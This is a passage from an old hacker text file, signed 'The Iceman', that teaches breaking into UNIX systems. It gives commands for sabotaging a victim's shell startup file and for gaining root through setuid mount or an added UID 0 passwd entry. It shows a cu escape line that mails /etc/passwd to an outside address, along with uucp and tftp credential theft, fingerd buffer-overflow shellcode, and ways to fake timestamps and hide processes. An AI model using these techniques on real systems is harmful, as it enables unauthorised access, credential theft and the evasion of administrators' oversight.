+have a clue what the problem is).  There is a whole range of tricks that can be
+played in this manner.  One possible trick is to add the entry:
+
+    echo "sleep 1" >> .cshrc
+    
+    to the victims .cshrc file.  Eventually, a large amount of these sleep
+commands will accumulate, with the only indication to the victim being that the
+system appears unusually sluggish at logon.  An alternative method is to lower
+the priority level of the users shell with the nice command.  Since all
+programs run by the user are spawned by the shell, they will also run at this
+lower priority level.
+
+    If a file is created under UNIX and opened, and then deleted, then the
+inode block information still exists as long as the process that did the
+create/ open/delete of the file is still active (this can be done by using the
+'nohup' command and putting the process in the backgound with '&', ie:
+
+    nohup <command> &
+    
+    This means the process will be around in the background forever).  The
+blocks occupied by the file will just seem to disappear from the system, but
+they are still yours to use.  To access them, bring the program that created
+the deleted file back into the foreground, and get the data back by creating a
+new file, reopening the old (deleted) one, and copying the hidden blocks into
+the new file.  This is a great way to hide information on a disk - there is
+absolutely NO WAY anybody (even the superuser) can get at this data.  The only
+way to recover the space is to archive all the (legitimate) files in the
+filesystem, and then re-initialize it (usually by reformatting the disk it's on
+and restoring the data from the archive it was backed up onto.
+    Another, much simpler (but not so foolproof) method to hide information is
+to use unlikely-looking filenames such as ".. " (dot dot space) and ..., as
+well as more ordinary-looking names like .mail.  These filenames, beginning
+with a dot, are not normally included in file lists by the shell.  Thus for
+example the ls command will not display them, unless invoked as ls -a to
+display all files.
+
+
+Low-Level File Access:
+======================
+
+    Again, only a few brief notes, there's far too much stuff to go into in any
+detail:
+    You can examine any device file using the octal debugger od, eg:
+
+    od -c /dev/hd08
+
+    will dump the data in hd08.  You can also use:
+
+    cat /dev/hd01
+
+    and similar commands.  If you dump a device file with a file system on it,
+the data will be seen as random blocks of 512 bytes.  At some point you should
+see directory listings.  Note that it is *very* risky to write to a device in
+raw mode as the raw device won't know anything about the file system in the
+partition and could overwrite pieces of it.
+    Another way to play around with file systems at a low level is with fsdb,
+the file system debugger (unfortunately this program is not present on all UNIX
+systems).  Again, this program is far too complicated to go into in detail.
+See the various UNIX manuals or Bell Labs papers - these are a mine of
+information on the technical details of UNIX.  Another source is the
+/usr/include directory, which contains the include files with the data
+structures used by these files.
+
+
+Floppy-Based UNIX Systems:
+==========================
+
+    The installation of UNIX on a hard disk is usually assisted by a standalone
+shell (SASH).  This is sometimes installed from tape, but is easiest to run
+from floppy.  The sequence of events on startup is this:
+
+    The floppy may be one single partition, or it may be divided up into a root
+partition and a user partition.  Either way, the floppy has a filesystem
+created from another system and placed on the disk.  Block one of the
+filesystem is the boot record, which is placed on the media by the 'dd'
+command.  Dd copies bytes starting at the beginning of the device.  The boot
+record contains code necessary to start UNIX from the disk.
+    Block two is the superblock, a kind of master directory to the filesystem,
+and has both the inodes pointing to information about each file and a list of
+available areas of free space.  The root filesystem also has a floppy version
+of the kernel, which boots up and runs the shell just as its big brother, the
+hard disk kernel, does for the system as a whole.  You can even mount the
+installation disk on another hard disk system and copy commands to it (more on
+this later).
+    Once the floppy kernel boots, it has a complete filesystem with all the
+device files.  It mounts the hard disk partition (assuming it has been
+partitioned) and copies files to it in system format.  It should look like
+this:
+
+    # mount /dev/hd01 /mnt      ; Issued from the floppy to mount the first
+                                ; partition of the hard disk.
+    # copy /unix /mnt           ; Copy hard disk kernel to hard disk partition.
+
+    Normally only root can mount filesystems.  On a large mainframe or mini,
+this makes sense.  But on a small desktop machine, it may be too restrictive
+for the environment.  To override this requirement, use the setuid capability:
+
+    # chown root /etc/mount; chmod 4511 /etc/mount
+    # chown root /etc/umount; chmod 4511 /etc/umount
+    
+    This now opens a huge security hole in the system - anybody with a setuid
+trapdoor program on a floppy can mount a filesystem, and become superuser of
+the whole system.  This is particularly easy to do with, say, a XENIX system if
+you have your own copy of XENIX for which you are the superuser.  All you need
+to do is prepare the relevant files in the comfort of your own home, take them
+to the target system, and within a matter of minutes you are the superuser.
+    An even simpler way to become superuser on a floppy system is to edit the
+/mnt/etc/passwd file using the mounted root filesystem to include an extra
+account with UID = 0, then halt the standalone UNIX shell and reboot from the
+hard disk, using the login created from the standalone shell.  Note, however,
+that there is a trap to fall into here:  The superblock of a filesystem is the
+key record about its size and contents.  Any problems in the superblock will
+blow away the filesystem.  There is a command, sync, which writes the core
+image of the superblock to the disk, thereby updating it.  This is something
+that should be done automatically and constantly to keep the disk image and the
+core image the same.  SYSV has a program called update, which is run from one
+of the bootup /etc/rc files.  It lives in the system and does a sync and sleep.
+The effect is that the file system information is kept current with recent
+changes in the actual file system.  If you don't have this on your system, you
+can write a shell script with a loop, a synch call, and an appropriate length
+of sleep, and run it in the background to provide this safety feature.
+However, if all you are planning to do is add one entry to the passwd file, the
+following command will suffice:
+
+    # sync /mnt/bin/vi /mnt/ect/passwd
+
+
+Tricks with UNIX Comms Facilities:
+==================================
+
+    UNIX offers several levels of comms which include file xfers, remote login,
+remote mail, and worldwide message systems that link thousands of UNIX systems.
+To actually find modems on a system, check /usr/lib/uucp/L-devices.  This file
+defines which ports are used and how they are used.  The format will be:
+
+    ACU cul0    cua0    1200
+    DIR tty00    0      9600
+        - etc -
+
+    ACU specifies an Automatic Call Unit, DIR specifies a direct connection.
+cu uses the DIR entries, uucp uses the ACU entries.  This makes it easy to find
+out how each serial port is referenced, what rate it runs at etc.  The above
+example shows that tty00 is a direct callout line.  The baud rates usable are
+300-9600, with the higher rates being for other machines rather than modems.
+    To find out lines coming into the system, check the files dialin and dialup
+in the /etc directory.  These files define which tty lines go through the login
+secondary password sequence for remote users and can only be used for dialling
+in.
+    A useful command is cu ("Call UNIX"), which dials out of the system:
+
+    cu dir
+    atdt1742
+
+would dial your local PACNET node at 1200 baud (assuming a Hayes modem).  The
+dir gives you a direct line.  1200 baud is the default speed, you can change it
+with -s, eg
+
+    cu -s300 -acua0 1742
+
+The second switch tells cu to dial automatically; the dial command is generated
+by /usr/lib/uucp/dial.  Note that some older versions of cu won't support this
+switch.
+    The cu command is another nice target for the sort of program presented
+above as a login decoy - it can give "line noise" as the reason for failing,
+which is much more believable by the victim than a "typing error".
+    Another thing to look for is the fact that on some versions of cu the local
+machine cannot tell how a line was generated when it gets it from the remote
+machine.  It just has a line of text.  Now cu allows escape sequences that are
+not transmitted, but instead cause certain useful functions to be performed.
+So for example any line beginning with "~%put" gets cu to copy a file from the
+local machine to the remote one; "~%take" does just the opposite.  Lines
+beginning with ! cause the command to be executed on the local machine (! being
+the standard shell escape character).  Sometimes, the local machine cannot tell
+where the command is originating from, making it is possible to do such fun
+things as:
+    
+    ~!mail <address> < /etc/passwd
+    
+which mails the password file anywhere you want.  Another possibility for
+getting a copy of the password file is to use a loophole in the tftp ("Trivial
+File Transfer Protocol") program.  Try connecting to a system and issuing the
+command:
+
+    get /etc/motd
+
+    There is a command similar to cu called ct: This is used to call out to a
+terminal to let that terminal log onto the machine.  This is *very* useful if
+you can get it because the target machine gets to pay the phone bill!
+
+    There is another command used to connect UNIX machines: The ubiquitous uucp
+("UNIX-UNIX copy").  This allows multiple machines to be joined to create a
+virtual environ- ment that lets you work on any machine.  The equivalence
+between cu and uucp is shown below:
+
+    Source machine:                             Dest machine:
+
+    cu -ltty00 -s9600 dir                       getty 9600 tty00
+                                                login username
+                                                csh
+
+    uucp file                                   getty 9600 tty00
+    <remote_sys>!~/<username>                   login uucp
+                                                uucico
+
+    The uucico ("UNIX-UNIX copy-in copy-out") process is generated by uucp, and
+calls the destination system.  The login sequence is the same as for cu except
+that instead of getting a shell at the end of the sequence, another uucico
+sequence is run that communicates with the calling process.  Of course this can
+be done via modem too.
+    To find which systems are accessible from your system, use the command
+uuname.
+    The directories used for file transfer are in /usr/spool/uucp.  This
+directory conatins LOGFILE, which, if used with the 'tail -f LOGFILE' command
+provides a useful runtime window into transfer operations.  All uucp and mail
+transactions go into the directory.  A transaction usually consists of a
+control file (C.*), and the data file (D.*).  When one machine is used as the
+central node, its uucp directory can fill up with a very large number of files.
+Regular maintenance and constant monitoring of the lock files (LCK* and STST*)
+is required by the system to ensure that everything is running all right.
+    The next directory to look out for is uucppublic (sometimes found in the
+shell variable PUBDIR), which contains directories named after each user, to
+store information in transit.  As such these dirs usually have all permission
+bits set so copying files to other people is possible.  To copy files from one
+system to another, use the command:
+
+    uucp * <remote_sys>!~/<username>
+
+This copies everything in the current directory to the system <remote_sys>,
+where the ~/ prefix to the <username> expands to /usr/spool/uucppublic.  Also,
+^<username> in expands in uucp to $HOME, and ^/<username> expands in uucp to
+$PUBDIR.  One things to watch for is uuclean type files, usually run by cron.
+These look for files in uucp directories that haven't been used for a while and
+zap them to free up space.  If you have anything of value in a uucp directory,
+you can either make sure you move it soon, or change crontab to either get
+uuclean to bypass your directory, or add your own entry to touch your files
+every so often to make them look recent.  A suitable command to do this is:
+
+    find /usr/spool/uucppublic -exec touch {} \;
+    
+    which will update the access- and modify-time of the file.  The {} puts in
+the literal name that matched the find statement.  You would want to put this
+in a scheduled process that runs more often than the cleanup program does.
+Note, however, that modifications to crontab are a sure sign that something
+fishy is going on to the superuser.
+    uucp is a major security risk for UNIX systems.  Usually all files in uucp
+directories have permission modes rwxrwxrwx.  uucp also requires all
+intermediate directories to have rw permission for everyone, so if someone
+uucp's files straight to their $HOME, they must give rw permission to this
+directory to the world at large.
+    When a remote system logs on using uucp, the capabilities the remote system
+has are stored in /usr/lib/uucp.  The file L.cmds contains all the commands
+that can be executed from the remote system.  If the remote system sends a
+command via uux (described below), it is only executed if the command is in
+L.cmds.  The file USERFILE defines which dirs the remote system may access, the
+default being 'uucp, /' which allows process uucp to access directories from /
+down.  The file L.sys contains the node names, phone numbers, login names, and
+passwords for all remote systems known to the central system.  Needless to say
+this file is a real treasure trove for hackers.  Unfortunately the owner is
+almost always root.  If you can get into this file, the form will be:
+
+    Type AccessTime AccessType Speed Number LoginSeq
+
+where:
+    Type can be any of:
+        remote - a remote system
+        selector - a port contender
+        direct - a direct line
+    AccessTime is the time the system can be accesses, usually Any (== 24Hr)
+    AccessType is either ACU or DIR
+    Speed is the speed in baud
+    Number is the phone number
+    LoginSeq is the uucp login sequence.  Note that uucp uses 'ogin' to dist-
+        inguish it from 'Login' or 'login'.  The sequence is the uucp login
+        name followed by the uucp password.
+
+    Note that uucp can be bypassed by calling uucico directly with the uusub
+call:
+
+    /usr/lib/uucp/uusub -c <remote_system>
+
+You may need to do this if the paranoid superuser has changed permission for
+uucp.
+    With some Berkeley systems after 4.1, if someone runs a 'door' script on
+the system, the rlogin logs them in on another machine as root and never asks
+for a root password.  You'll be lucky to get this though (I've never had it
+happen).
+    A program related to uucp is uux ("UNIX-UNIX Execute"), which as its name
+implies allows execution of programs on a remote system.  Its main use is to
+start up the mail delivery machinery on a remote system after uucp has
+delivered the mail files to a spooling area.  To ensure full generality, the
+remote system passes arguments to uux to a shell for execution.  Now the far
+end of a uucp transaction needs only to see whether access to some file is
+legitimate, but the far end of a uux transaction must examine the command and
+its context and decide whether the result will be harmful.  This is very
+difficult because the shell has all sorts of quoting conventions deliberately
+designed to hide certain types of strings until the proper time for their
+expansion.  With sufficient programming experience it should be possible to do
+some interesting things here.  I have never bothered to try it myself.
+    Another thing worth trying is making your own personal copy of uucp.  No
+special permissions are required, either to run the program or to access the
+phone lines.  The private copy can assert that it is copying from anywhere, and
+there is no way for the target machine to verify this.
+
+
+Advanced Techniques:
+====================
+    
+    This sections describes a typical method of attack which is rather too
+specific to add to one of the above sections, and yet is a valid example of
+what can be done to become superuser on a system.  It is intended to illustrate
+a typical means of attack, one of many which have been used to gain access to
+systems.... 
+
+    The finger program is a utility that allows users to obtain information
+about other users.  It is usually used to indentify the full name or login of
+another user, whether or not the user is currently logged in, and possibly
+other information about the person such as telephone numbers and where he or
+she can be reached.  The fingerd program is intended to run as a daemon to
+service remote requests using the finger protocol (described in RFC 742, SRI
+Network Information Centre).  Basically, this daemon accepts connections from
+remote programs, reads a single line of input, and sends back output matching
+the received request.
+    The standard C library calls do very little checking of input, leaving it
+up to the user to do such things as bounds checking and so on.  In particular,
+the gets() call, which is used in fingerd, takes input to a buffer without
+doing any bounds checking.  Now when a string of greater than 512 characters is
+passed to a fingerd daemon running on a VAX system under BSD 4.x, it overflows
+its input buffer and overwrites parts of the stack frame for the main()
+routine, so that the return address points into the buffer on the stack.  The
+code on the stack at this point corresponded to:
+
+    execve("/bin/sh", 0, 0);
+    
+or:
+
+    pushl   $68732f         '/sh\0'
+    pushl   $6e69622f       '/bin'
+    movl    sp, r10
+    pushl   $0
+    pushl   $0
+    pushl   r10
+    pushl   $3
+    movl    sp, ap
+    chmk    $3b
+    
+which results in the creation of a shell with UID = 0.  (On a non-VAX machine
+it results in the creation a core dump.  However it is a simple matter of
+programming to rewrite this for practically any system).
+
+
+Time Stamps on Files:
+=====================
+
+    The following are the time stamps UNIX puts on files:
+
+    Inode time:     Updated by:
+    ===========     ===========
+    Access time     creat, mknod, pipe, utime, read
+    Modify time     creat, mknod, pipe, utime, write
+    Create time     creat, mknod, pipe, utime, write, chmod, chown, link
+
+    However, anybody can change the access/modify (but not the create) time for
+any file - useful when you have patched a system file and want to cover your
+tracks.  You can change the time with the utime() call, with touch, or or (as a
+last resort) fsdb, the file system debugger.  Note that if the super- user is
+rather paranoid, you can touch a certain important system file (say getty,
+passwd, etc) and it will look to them as if it's been recently modified.  You
+don't need to go to great lengths, even simple tricks like this can cause an
+appropriate amount of panic in the right places.
+
+
+Online Help:
+============
+
+    UNIX has an online help facility in the form of the 'man' command.  This
+command prints sections of the user manual given a command name.  References to
+other commands take the form 'cmd-name ( section )'.  The sections of the
+manual are:
+
+    1 Commands available to users
+    2 UNIX/C system call interfaces
+    3 C library routines
+    4 Special files
+    5 File formats and conventions
+    6 Games
+    7 Word processing packages
+    8 System maintenance commands and procedures.
+    
+    The user manual can act as an online thesaurus, giving you references to
+commands that perform many neat and interesting tricks that you wouldn't
+normally find out about.  Playing about with man is a great way to spend a few
+hours.
+
+
+General Notes:
+==============
+
+    - When you move a file, UNIX keeps the old inode and therefore the GID and
+      UID.
+    - Use cp to set GID and UID to yourself.
+    - Some files have the same inode, for example ex and vi are one and the 
+      same: The program checks argv[ 0 ] for which version of the program you
+      want.  Use ncheck -i <inode> to find all programs that belong to the 
+      same inode.  Note that if you are running program you shouldn't be 
+      running, it is a good idea to obscure argv[ 0 ] with something innocuous
+      so nobody can use the ps command to find out what you are actually doing.
+      Another good idea is to periodically fork off a child copy of the program
+      and have it kill its parent.  In this way the process will continually
+      change its process ID (PID), as well as making sure that it never seems
+      to soak up excessive amounts of system time.
+    - To execute a command at a specified time, use the at command:
+    
+        at HH:MM <command> <; command...>
+    
+    - To check which user is running what, use:
+
+        ps -ef > tmp/ps
+        fgrep <name> /tmp/ps
+
+      Note that this is rather slow....
+      A much faster method is to use:
+    
+        w -d
+    
+      This prints all sorts of useful information about who is doing what, but 
+      only for the local group of terminals being used.
+    - Finding text strings within files can be done using the 'strings' 
+      command.  For example to dig all text strings out of the login command:
+
+        strings /bin/login | more
+    
+      Note that the strings command is BSD only.
+
+
+Some Moralising:
+================
+
+    While this document describes many ways in which to cause havoc on a UNIX
+system, you should always remember that people other than you also have a right
+to use the system.  Crashing a VAX is trivial and juvenile.  Setting up an
+unofficial information forwarding system in order to acquire a UseNet feed is
+not.  I have never deliberately caused any damage on any system in which I have
+been a guest.  Try and do the same.
+
+
+Last Words:
+===========
+
+    A good thing to do before you try your luck with the real thing is to
+practice on a private copy of UNIX such as PC-UNIX.  Note that streamlined
+clones like QNX aren't very close to standard UNIX and shouldn't be relied on
+for low-level hacking.  A read through the XINU book or a look at MINIX, Andy
+Tanenbaum's version of UNIX written for teaching, can be very educational.
+MINIX is available for US$79.95 (including full source) - this also includes
+source for system utilities etc - a goldmine for the hacker.  With the current
+cost of a licence for SYSV source in five (six??) figures, the amount of
+up-to-date source on UNIX systems will probably approach zero in the near
+future, so a system like MINIX is well worth getting if you want to know what
+makes UNIX tick.  MINIX is extensively discussed on NetNews, which you can get
+onto reasonably easily by impersonating a uucp node as described above.
+
+                                                    Enjoy,
+                                                    The Iceman.
+
+------------------------------------------------------------------------------
+AUTHOR : Iceman
+------------------------------------------------------------------------------
+Brought to the WORLD by The Banana Republic BBS, Auckland, New Zealand.
+------------------------------------------------------------------------------
+
